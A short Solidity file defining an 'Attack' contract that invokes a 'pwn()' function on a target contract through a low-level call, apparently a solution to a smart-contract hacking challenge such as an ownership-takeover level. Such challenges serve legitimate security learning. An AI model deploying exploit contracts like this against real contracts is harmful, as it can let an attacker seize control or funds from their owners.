// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Target {
    function pwn() external;
}

contract Attack {
    Target target;
    constructor(address _target) {
        target = Target(_target);
    }

    function pwn() public {
        (bool success, ) = address(target).call(abi.encodeWithSignature("pwn()"));
        require(success, "Call failed");
    }
}